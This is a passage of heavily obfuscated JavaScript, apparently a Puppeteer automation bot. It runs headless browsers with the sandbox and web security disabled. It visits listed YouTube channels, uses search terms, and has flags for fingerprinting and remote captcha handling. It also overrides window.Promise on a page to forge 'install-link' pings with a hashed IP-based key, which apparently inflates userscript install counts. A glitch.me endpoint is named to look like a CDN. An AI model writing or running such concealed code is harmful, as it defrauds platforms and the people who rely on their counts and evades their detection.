-0x4 + -0x8d3 & -0x1828 + -0x76 * -0xf + -0x25 * -0x79) << y[0x1de7 * 0x1 + -0x2ce * 0x3 + -0x157a & N++], P[N >> -0x524 + -0xa7 * -0xf + -0x4a3] |= (0x1e8a + -0x232 * 0x3 + -0x9e * 0x26 | L >> -0x1ab9 * -0x1 + 0x16 * 0x4a + 0x210f * -0x1 & -0x533 * -0x1 + -0x1f80 + 0x1a8c) << y[-0xbe3 + -0x303 + 0x1 * 0xee9 & N++], P[N >> 0x3 * 0xcf7 + 0x2706 + -0x4de9 * 0x1] |= (-0x1 * 0x139 + 0x1ae9 + -0x1930 | 0x14a0 + 0x1c1 * -0x7 + 0x11 * -0x7a & L) << y[0x19b * 0x9 + 0x1b70 + -0x29e0 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1199 + 0xb9e + 0x1 * 0x63b ? (this['block'] = P[0x5f9 * -0x3 + 0xcdc * -0x2 + 0x2bb3], this['start'] = N - (-0x1484 + 0x1e8b + 0x9c7 * -0x1), this['hash'](), this['hashed'] = 0x71 * -0x4d + -0x13bd * 0x1 + -0x5 * -0xabf) : this['start'] = N;
                }
                return this['bytes'] > 0x14b * 0x109a449 + -0x21b59cf1 * 0xb + 0x11b5653f7 && (this['hBytes'] += this['bytes'] / (0x1b4fec70 + 0xa80902d2 * -0x2 + -0x11a610c9a * -0x2) << 0x395 * -0x4 + -0xfda + 0x1e2e, this['bytes'] = this['bytes'] % (-0xbf * 0xb42fe4 + -0xc1f31fbc + 0x24862dad8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x9ba + -0x44 * 0x7d + 0x2aef;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x3f3 + 0x2465 + -0x509 * 0x8] = this['block'], J[K >> 0x18f * 0x7 + 0x11dd * 0x1 + -0x1cc4] |= x[-0x14 * -0x4d + 0x3 * -0x264 + 0x12b & K], this['block'] = J[0x1ab9 + 0xc4a + -0x26f3], K >= -0xdfc + 0x25df + -0x17ab && (this['hashed'] || this['hash'](), J[-0x6 * 0x68 + 0x1d2 + 0x4f * 0x2] = this['block'], J[0x1 * -0x1070 + 0x1bbd + -0xb3d] = J[-0x5b3 + -0x1 * 0x26c9 + 0x7 * 0x65b] = J[-0x3d0 * 0x2 + -0xd02 + 0x529 * 0x4] = J[0x10c0 + -0x1805 + 0x748] = J[0xc86 + 0x20 * -0xd + -0xae2] = J[-0x2 * -0x829 + -0x282 + 0xb * -0x141] = J[0xc1 * -0x1c + -0x1 * -0x72d + 0xdf5] = J[0x17f + 0x37f + -0x4f7] = J[-0x3bd + 0x110 * -0x1b + 0x2075] = J[-0x95f * -0x1 + -0x1670 + 0xd1a] = J[0x1227 * -0x1 + -0x1b36 + 0x1 * 0x2d67] = J[0x1962 + 0x1 * -0x20b8 + 0x761] = J[0x41b * 0x1 + -0x3e * 0x98 + -0x68d * -0x5] = J[0x1e0f + 0x1b64 + -0x3966] = J[-0x1a81 + 0x24b * -0x6 + 0x2851] = J[0x7d3 + 0x7 * 0xfb + -0x5 * 0x2ed] = -0x4c * 0x16 + 0x4f4 * -0x5 + 0x1f4c), J[0xd01 + -0x2535 + 0x1b * 0xe6] = this['hBytes'] << 0x1543 * -0x1 + 0x24a6 * -0x1 + -0x2c * -0x151 | this['bytes'] >>> 0x22c + 0x24b5 * -0x1 + 0x22a6, J[-0x9 * 0x219 + 0x1 * -0x208e + 0x112a * 0x3] = this['bytes'] << -0x145f + -0x1c4b + 0x30ad, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2489 + 0x1 * 0x731 + 0x6 * -0x747; J < 0x156b + 0x90b * -0x2 + 0x305 * -0x1; ++J)
                K = Q[J - (0x1 * -0x20c3 + -0x231c + 0x43e2)] ^ Q[J - (-0x2f1 + 0xf04 + -0xc0b)] ^ Q[J - (0x1944 + 0x30f + -0x1 * 0x1c45)] ^ Q[J - (-0xa6e * 0x3 + 0x2546 + 0x4 * -0x17b)], Q[J] = K << -0x17 * -0x83 + 0xbe5 + 0x7e3 * -0x3 | K >>> -0x16cb + 0x1 * 0x189e + 0x1b4 * -0x1;
              for (J = -0xd9 * 0x7 + 0x2 * 0x8a7 + -0xb5f; J < 0x1294 + -0x7 * -0x2f7 + 0x305 * -0xd; J += -0x1aaa + -0x128b * 0x1 + -0x169d * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x12 * 0x134 + -0x1037 + -0x19 * -0x184 | L >>> 0x16e2 + 0x11cf + 0x2 * -0x144b) + (M & N | ~M & O) + P + (0x677 * -0x17c36d + -0x163 * 0x27cc92 + 0x12b538dba) + Q[J] << -0x200c + -0x12bc + 0x14 * 0x28a) << 0x13 * -0xdf + 0x16bf + 0x20f * -0x3 | P >>> 0x2519 + 0x18ac + -0x3daa) + (L & (M = M << -0xaa5 + -0x166e + 0x2131 | M >>> -0x1d93 + 0x790 * 0x5 + -0x83b) | ~L & N) + O + (0x203e0da4 + -0x1 * 0xb4e9afe9 + 0x6 * 0x27dd04a5) + Q[J + (-0x2419 + -0x197 * 0x8 + 0x30d2)] << -0x4 * -0x99f + 0xed5 + 0x1 * -0x3551) << -0x4 * 0x1a + -0x346 + 0x3b3 * 0x1 | O >>> 0x6ef * -0x1 + -0x14bd + 0x1 * 0x1bc7) + (P & (L = L << -0x1df4 + 0x26b9 + -0x8a7 * 0x1 | L >>> 0x24a1 + 0x2181 + -0x198 * 0x2c) | ~P & M) + N + (-0x169114d0 + 0x1f3dab * 0x63 + 0x2 * 0x327f5aa4) + Q[J + (0x991 * 0x1 + 0x216a + -0x2af9)] << 0x13be + 0x10f * -0xb + -0x819) << 0x1427 + 0x11 * 0x1 + -0x1433 | N >>> -0x1d * 0x151 + -0x1024 + 0x4 * 0xd9b) + (O & (P = P << 0x1111 * -0x2 + 0x1714 + 0xb2c | P >>> -0x3c * 0x3d + -0xa3d + 0x1 * 0x188b) | ~O & L) + M + (-0x5a54d57b + 0x65afa0e0 + 0x2 * 0x2793d71a) + Q[J + (0x7e5 * 0x4 + 0x1d2 + -0x21 * 0x103)] << 0x2 * 0x6f7 + -0x10d2 + 0x2e4) << -0x64d + -0x1d30 + 0x2382 | M >>> 0x1fba + 0x20fb + -0x409a * 0x1) + (N & (O = O << 0xb * -0x1c0 + -0x9bc + 0x1d1a | O >>> 0x7ff + 0x18 + -0x815) | ~N & P) + L + (-0xa9c56b90 + 0x5 * 0x1d467488 + 0x71e79e81) + Q[J + (-0x155a + -0x93b * 0x4 + 0x3a4a)] << -0x47 * -0x4b + 0x1351 + -0x281e, N = N << 0x4 + 0x867 * 0x2 + -0x10b4 | N >>> -0x235a + -0x232b + 0x73 * 0x9d;
              for (; J < -0x2c2 * 0xa + 0x1cd5 + -0x119; J += -0xa7 * 0x17 + -0x833 * 0x2 + -0x4 * -0x7db)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * -0x62b + 0x224a + -0x15ef | L >>> -0x1403 + 0xa7 * 0xd + 0x3e1 * 0x3) + (M ^ N ^ O) + P + (0x2 * 0xe099dd6 + 0x16701652 + 0x3c5699a3 * 0x1) + Q[J] << -0xb0d + -0xf0e + 0x1a1b) << 0x231b + -0x6 * -0x318 + -0x35a6 | P >>> -0x1 * -0x1075 + -0x1 * -0x158d + -0x25e7) + (L ^ (M = M << 0x115f + 0x69 + -0x11 * 0x10a | M >>> 0x43 * 0x6b + -0x4 * -0x36e + -0x29b7) ^ N) + O + (0x246810 + -0x22 * -0x1ebb2bb + 0x2d67c6bb) + Q[J + (0x23ea * 0x1 + -0x11df + -0x120a)] << -0xe23 + -0x22dd + 0xe0 * 0x38) << -0x1a67 + -0x193d + 0x17 * 0x23f | O >>> -0x18eb * 0x1 + 0x1fa9 + 0x6a3 * -0x1) + (P ^ (L = L << 0x111e * 0x2 + -0x1b41 + 0x6dd * -0x1 | L >>> -0x463 + -0xf1a * -0x2 + -0x1 * 0x19cf) ^ M) + N + (-0x178d1786 + -0x4898587a + 0xceff5ba1) + Q[J + (0x1527 + 0x1337 + 0x54 * -0x7b)] << -0x2 * 0x1c0 + -0x3f9 * -0x9 + -0x17 * 0x167) << 0x22 * 0xc7 + -0x1fdf * -0x1 + -0x3a48 | N >>> -0x6d * -0x50 + 0x8f7 + 0x2aec * -0x1) + (O ^ (P = P << -0x1fd5 + 0x85f + 0x3ee * 0x6 | P >>> -0xdd + 0x10a3 + 0x2 * -0x7e2) ^ L) + M + (0xc71b013b + -0xb3dfb2ff + 0x5b9e9d65) + Q[J + (-0x9 * 0x126 + -0x6 * -0x21a + -0x3 * 0xc1)] << -0x1ddd + -0xa81 * 0x2 + 0x9 * 0x5a7) << -0x2a8 * -0xb + 0x14f8 + 0x3 * -0x10b9 | M >>> -0xb * -0x24c + -0xd38 + -0xbf1) + (N ^ (O = O << -0x1 * 0x223a + -0x4 * -0xf1 + 0x13 * 0x19c | O >>> 0x723 + 0xa * -0x30a + 0x1743) ^ P) + L + (0x4d15ea * -0x1e1 + -0xd52dda58 + 0x1d4ddf2a3) + Q[J + (0xe34 * -0x2 + -0x68e + -0x22fa * -0x1)] << -0x198a + 0x1f48 + 0x31 * -0x1e, N = N << -0x22cc + -0x1 * -0xaab + 0x1 * 0x183f | N >>> -0x1b99 * -0x1 + 0x301 * -0xd + 0xb76;
              for (; J < 0x1 * 0xe0b + 0xdba + -0x13 * 0x173; J += -0x232 * 0xc + -0x24c1 + -0x2 * -0x1f8f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xc08 + -0x18 * 0xe9 + 0x9d5 | L >>> -0x1ecb + -0xad4 + 0x29ba) + (M & N | M & O | N & O) + P - (-0x2eb6c0 * 0x1f5 + 0xa28ae * 0xa3 + 0x1 * 0xc5d8021a) + Q[J] << -0x421 + 0x67a + -0x1 * 0x259) << -0x1391 + 0x1a3a + -0x64 * 0x11 | P >>> -0x1a9d + -0x1eb9 * 0x1 + -0xb7d * -0x5) + (L & (M = M << -0x821 + -0x20a * 0x5 + 0x1271 | M >>> -0x17c4 + 0xccc + 0xafa) | L & N | M & N) + O - (-0x335cc723 + 0x25 * 0x205985b + 0x59720520) + Q[J + (-0x76d + 0xd95 + 0x5 * -0x13b)] << -0x3 * -0xcca + 0x1010 + -0x366e) << -0x7 * 0x199 + -0x25 * -0xf2 + 0x22 * -0xb3 | O >>> -0xb55 + -0x152 * 0x1 + 0xcc2 * 0x1) + (P & (L = L << 0x1 * -0x97 + -0x1c56 * 0x1 + 0x1d0b * 0x1 | L >>> 0x33c * -0x1 + 0x2 * -0x12b9 + 0x28b0) | P & M | L & M) + N - (-0x62f9d2a5 * -0x2 + -0x28737d7b * -0x1 + -0x7d82dfa1) + Q[J + (-0x3c9 + 0x1982 + -0x15b7)] << -0xcf8 * 0x1 + 0x101b + 0x49 * -0xb) << -0xf5c + -0x934 * -0x1 + -0x5d * -0x11 | N >>> 0x171b + 0x1 * 0x1ff9 + -0x36f9) + (O & (P = P << 0x1613 * 0x1 + -0x12e0 + -0x315 | P >>> -0x6b3 * -0x5 + -0x14b + 0xd * -0x27a) | O & L | P & L) + M - (0x66d07e1 * 0x23 + 0xdc9235fa + -0x14c960699) + Q[J + (0x1 * 0x24bc + -0xe2 * 0x2 + -0x39 * 0x9d)] << -0x1ce5 + 0x991 + -0x4d5 * -0x4) << 0x1ab9 + -0x5f * -0x2f + -0x2c25 | M >>> 0x1 * 0x24db + 0x2206 + -0x46c6) + (N & (O = O << -0x2e * 0x8f + -0x1 * 0xfa + 0x1aca | O >>> -0xc83 * -0x1 + 0x641 + -0x961 * 0x2) | N & P | O & P) + L - (-0x5b7a86f + 0xbb8c157c + -0x44f029e9) + Q[J + (-0x10b1 * 0x1 + -0x25 * -0x61 + 0x2b0)] << 0x767 * -0x5 + -0x1807 + 0x3d0a, N = N << 0x2222 + 0x50d + 0x1 * -0x2711 | N >>> 0x5 * 0x3e5 + -0x1f30 * 0x1 + 0xbb9;
              for (; J < 0x210 + 0x1 * 0x9ad + 0x19 * -0x75; J += 0x2 * 0x54e + 0x953 + 0x9f5 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1993 * 0x1 + -0x1f9 + -0x1795 | L >>> -0x1462 + 0x2317 * 0x1 + -0xe9a) + (M ^ N ^ O) + P - (-0x1 * 0x58ce0ee1 + -0x4c1 * 0xc5efe + 0x1cbf44ef * 0x7) + Q[J] << 0x18c1 + -0xfc3 + -0x8fe) << -0xa90 * -0x1 + -0xc24 + 0x1 * 0x199 | P >>> -0x1470 + -0x1868 + 0x2cf3) + (L ^ (M = M << 0x2 * -0x1f7 + 0x215f + -0x1 * 0x1d53 | M >>> -0x970 + -0x139a + 0x1d0c) ^ N) + O - (-0x3641076d + -0x2ffd2083 + 0x9bdb661a) + Q[J + (-0xbf * 0x3 + -0xba0 + -0x5 * -0x2c6)] << -0xcf1 * 0x2 + -0x25 * -0x84 + -0x86 * -0xd) << 0x1447 + 0x9c * 0x3c + 0xe * -0x40f | O >>> 0x1a89 * -0x1 + 0x1d70 + -0xb3 * 0x4) + (P ^ (L = L << 0x434 + 0x43 * 0x7 + -0x5eb | L >>> -0x159b + 0x254b + 0x29d * -0x6) ^ M) + N - (0x4330ad4e + 0x67b4b4eb + -0x7548240f) + Q[J + (0x568 + -0x5a8 + 0x42)] << 0x119c + -0x24bf + -0x1 * -0x1323) << -0x3 * 0x1a7 + -0x1ef5 + -0x23ef * -0x1 | N >>> 0x22d3 + -0x6cf + -0x1be9) + (O ^ (P = P << 0xa07 + 0x1 * 0xd31 + -0x171a | P >>> 0x3db + -0x290 + -0x7 * 0x2f) ^ L) + M - (-0x1 * 0x305c4f4 + 0x4130edc5 + -0x88deaa7) + Q[J + (0x128e + -0x13f7 + 0x16c)] << 0xd * 0x5b + -0x1ceb * -0x1 + 0x2 * -0x10c5) << 0x17c4 + -0x194d + 0x18e | M >>> 0xad6 + -0x21d8 + 0x171d) + (N ^ (O = O << -0x2 * 0x957 + 0x1f0b + -0xc3f | O >>> 0x1708 + 0x12ec * 0x1 + -0x29f2) ^ P) + L - (0x21063b76 + 0x35e99178 + -0x1 * 0x21528ec4) + Q[J + (0x113d * 0x1 + 0x26d8 + -0x3811 * 0x1)] << -0x1cb * 0x7 + -0x7 * -0x1de + -0x85, N = N << 0x1 * -0x2575 + -0x1db4 + -0x4347 * -0x1 | N >>> -0x3 * 0x8db + -0x9 * 0x2bd + 0xb * 0x4a8;
              this['h0'] = this['h0'] + L << 0x1 * 0x15f7 + -0x22 * -0x95 + -0x1fd * 0x15, this['h1'] = this['h1'] + M << -0xea * -0x1 + -0x9b1 + -0x8c7 * -0x1, this['h2'] = this['h2'] + N << 0x1cda + -0x1c44 + -0x96, this['h3'] = this['h3'] + O << 0x1291 * -0x2 + -0x307 * 0x7 + -0xed * -0x3f, this['h4'] = this['h4'] + P << 0x123a + 0x21db + -0x3415;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2640 + -0x2225 + -0x3ff & -0x6ab + 0xc2 * 0x26 + -0xe2 * 0x19] + w[J >> 0x1 * 0x212b + 0x351 * -0x3 + -0x1720 & -0x1 * 0x3d5 + -0xec2 + 0x12a6] + w[J >> 0x122 * -0x7 + -0x151 * -0x7 + -0x135 & 0x1781 * 0x1 + -0x2288 + -0x2 * -0x58b] + w[J >> 0x16e0 + -0x45a * -0x5 + -0x2c92 & -0xb * -0x379 + -0x275 * -0xd + -0x4d * 0xe9] + w[J >> -0x99 * -0x1c + -0xb0 * -0x2 + 0x44 * -0x44 & -0x5 * -0x28d + 0x341 * -0x1 + -0x971 * 0x1] + w[J >> 0x3f * 0x23 + 0xb * 0x61 + -0xcc0 & 0x77 * 0x11 + 0x1c7 + -0x99f * 0x1] + w[J >> 0x12 * 0x44 + -0x7f * 0x27 + 0xe95 & -0xbb3 + 0x1 * -0x100b + 0xb * 0x287] + w[-0x31 * -0x7c + -0xf2 * -0x17 + 0x2d6b * -0x1 & J] + w[K >> -0x3 * -0xb84 + 0x35b * 0x8 + -0x3d48 & 0x1b * -0x47 + -0x83 * 0x6 + 0x97 * 0x12] + w[K >> -0x21be + -0x25a9 + 0x477f & -0x1 * 0xac9 + 0xe45 * 0x1 + -0x36d] + w[K >> -0x1017 + 0x159a + -0x56f & 0x758 + 0x742 * 0x2 + 0x15cd * -0x1] + w[K >> 0xb * 0x36e + 0x7e1 * 0x4 + 0x9e2 * -0x7 & -0x5 * 0x427 + -0xef3 * 0x2 + 0x32b8] + w[K >> -0x1431 + 0x4 * -0x982 + -0x3a45 * -0x1 & 0x118d + -0x1b7b + 0x1 * 0x9fd] + w[K >> 0x3 * -0x59f + -0xfb * -0x1f + -0x36 * 0x40 & 0x95 * -0x20 + 0x1931 + -0xe * 0x77] + w[K >> 0x1 * 0x1547 + 0x1cb9 + 0x7 * -0x724 & -0x2608 + -0x1c0a + -0x1 * -0x4221] + w[-0x3 * -0x81f + -0xb0e * 0x1 + -0xd40 & K] + w[L >> -0x65 * -0x4a + -0x6f1 * -0x1 + -0x2407 & -0x1 * -0x1d80 + -0xb09 * 0x3 + 0x3aa] + w[L >> -0x1511 * 0x1 + -0x950 + 0x1e79 & 0x145 * -0xf + -0xd * 0x206 + 0x2 * 0x16b4] + w[L >> 0x2326 + -0x8c * 0xb + 0xe87 * -0x2 & -0x22a9 * -0x1 + -0x1f1c + -0x37e] + w[L >> -0x48 * -0x55 + 0x16b5 + -0x2e8d * 0x1 & -0x1024 * 0x2 + 0x4 * 0x56f + 0xa9b] + w[L >> -0xa98 + -0x3d1 + 0xe75 & -0xe5b + 0xbb2 * -0x2 + 0xc9a * 0x3] + w[L >> -0x1765 + 0x1 * 0x1b13 + -0x3a6 * 0x1 & -0x1682 + -0x13e2 + 0x1 * 0x2a73] + w[L >> -0x11e * -0x22 + 0x2df + 0xd9d * -0x3 & 0x1 * 0xafa + -0xe4 + -0xa07] + w[0xe0d + 0x1721 + -0x251f & L] + w[M >> 0x10ad + 0xf95 * -0x2 + 0xe99 & 0x88 * 0x38 + 0x5f1 + -0x23a2] + w[M >> 0x3d0 * -0x1 + 0x3 * 0x9bb + -0x1949 & 0x4 * -0x50b + 0x10a9 + 0x392] + w[M >> 0xc * -0xbb + 0x1d * 0x8c + -0x4 * 0x1c1 & -0x5 * -0x1ad + 0x10f * 0x1f + -0x2923] + w[M >> 0x67a * -0x5 + 0x2384 + -0x312 & -0xee3 + -0x196b * -0x1 + 0x1 * -0xa79] + w[M >> -0x3e1 * 0x8 + -0x996 + -0x2 * -0x1455 & 0x1 * -0x41b + 0x1b83 + 0x2b * -0x8b] + w[M >> 0xf26 * 0x1 + -0x1 * -0x10f3 + -0x2011 & 0x95c * -0x1 + -0x1553 + 0xf5f * 0x2] + w[M >> -0x22d0 + -0x266 * -0x5 + 0x16d6 & 0x1 * 0x1877 + -0x2292 + 0xa2a] + w[0xacb + -0x17 * 0x133 + 0x10d9 & M] + w[N >> -0xc91 + 0x861 + -0x32 * -0x16 & 0xdc * 0x1 + -0x3e * -0x81 + -0x200b] + w[N >> -0x1fb7 + 0x1373 + -0x4 * -0x317 & 0x1 * -0x2309 + -0x238a + 0x2 * 0x2351] + w[N >> -0x3c7 * -0x2 + -0x18e0 + 0x1166 & 0x1cf7 + -0x217c + 0x494] + w[N >> -0x165c + -0x21aa + -0x1 * -0x3816 & 0xa * 0x25b + -0x8 * -0x20b + -0x27d7] + w[N >> 0x1bc4 + 0x607 + -0x21bf & 0x22bb + 0x23cf + -0x467b * 0x1] + w[N >> 0x21 * -0x3d + -0x1566 + 0x1 * 0x1d4b & 0x269d + 0x1 * -0x24c2 + -0x1cc] + w[N >> 0x22 * -0xd1 + 0x9 * 0x3b4 + -0x58e & -0x26ef * 0x1 + 0x1 * -0x485 + -0x2f * -0xed] + w[-0x2565 * -0x1 + 0x25e + 0x134 * -0x21 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x4f5 + 0x7ef * 0x3 + 0x3c0 * -0x5 & -0x2 * -0x1b1 + 0x2da * 0x4 + -0xdcb * 0x1,
                J >> -0x1 * 0x2505 + -0x1774 + -0x1 * -0x3c89 & -0x4b6 + -0x2095 * -0x1 + -0xac * 0x28,
                J >> -0x1db8 + 0xad3 + 0x12ed & 0x256d + 0x1 * -0x1979 + -0xaf5,
                0x1e6f + -0x1c4d + -0x123 & J,
                K >> -0x119 * 0x1f + 0x523 * 0x1 + -0x14 * -0x173 & 0x9fe * 0x3 + 0x1595 + -0x3290 * 0x1,
                K >> -0x894 + 0xa54 + 0x4 * -0x6c & -0x1 * 0x1aba + -0x15dc + 0x1 * 0x3195,
                K >> -0x172f + 0xf2e + 0x809 & 0x1 * -0x124d + -0x11eb + -0x7 * -0x551,
                0x555 + -0x3c5 * 0x1 + -0x91 & K,
                L >> -0x1 * -0x1b09 + -0x26e9 + 0xbf8 & -0x1 * -0x96d + 0x1c40 + -0x24ae,
                L >> 0xff7 + 0x1fca + -0x2fb1 * 0x1 & 0x1 * -0x21ab + 0x1 * -0x957 + 0xeab * 0x3,
                L >> -0xcb9 * 0x3 + -0x838 + 0x2e6b & 0x617 * 0x1 + 0x8cb * -0x1 + -0x3b3 * -0x1,
                -0xa3 * -0xa + 0x2178 + 0x26d7 * -0x1 & L,
                M >> 0xa6d + -0x206a + 0x1615 & 0x4 * -0x160 + 0x3 * 0x871 + -0x12d4,
                M >> -0x7 * -0xd3 + -0x2486 + 0x1ed1 & -0xca * 0x10 + -0x26d6 + -0x409 * -0xd,
                M >> 0x49 * 0x19 + 0x1b50 + 0x1 * -0x2269 & 0x1c5a + 0x1 * -0x2033 + 0x4d8,
                0x10d9 + 0x7b * 0x44 + -0x2 * 0x1843 & M,
                N >> -0xb * -0x313 + 0x1 * 0x121f + -0x4 * 0xcf6 & -0x30e * 0xa + -0x7 + -0x543 * -0x6,
                N >> 0x74b + 0x354 + 0x33 * -0x35 & 0x1e70 * -0x1 + -0x6 * -0x3fe + 0x77b,
                N >> -0x1fc7 * 0x1 + -0x5 * -0x373 + 0xe90 & 0x1fff * -0x1 + 0x23bc + -0x2be,
                -0x771 + -0x608 + 0x73c * 0x2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2 * -0xcb0 + -0x4 * -0x142 + 0x146c), (K = new DataView(J))['setUint32'](-0x1525 * -0x1 + 0x2 * 0x7eb + -0x1 * 0x24fb, this['h0']), K['setUint32'](0x161a + -0x7da + -0xe3c, this['h1']), K['setUint32'](-0x3b * 0x6b + 0x3 * 0xa1b + 0x48 * -0x14, this['h2']), K['setUint32'](0x6a * -0x2a + 0x20 * -0x7d + 0x2110, this['h3']), K['setUint32'](-0xa1 * -0x11 + 0x192e + -0x23cf, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x23a8 + 0x58f * 0x5 + 0x7dd];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x8 * 0x395 + 0xc6f + -0x2917;
            J[-0x28a + -0x6e + 0x2f8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x221e + 0x1393 + 0xe8b] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1b5d + 0x3 * -0xa9c + 0x1 * 0x3b32), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1 * -0x1a56 + 0xab1 + -0x1283 * 0x2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1d8a + -0x88e + -0x184 * -0x1d), Promise['resolve'](-0x1 * -0x1cc1 + -0x1fd * -0x1 + -0x2b * 0xb7);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1430 + -0x18e8 + -0x25c * -0x2; j < 0xb40 + 0x3 * 0x85b + 0x14c * -0x1c; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x39 * 0xa3 + -0x22e + -0xd5 * 0x29);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = 0x1 * 0x193c + -0x1501 + -0x1 * -0x1b05 + (-0xc81 * 0x1 + -0x17c7 + -0x1000 * -0x3) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x789 * 0x3 + 0x6 * -0x5c0 + 0x7f * 0x18) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + U(0x16) + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + V(0x5, '(RXG') + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x14fb + -0x1c79 + 0x3174; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + U(0x1e) + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + 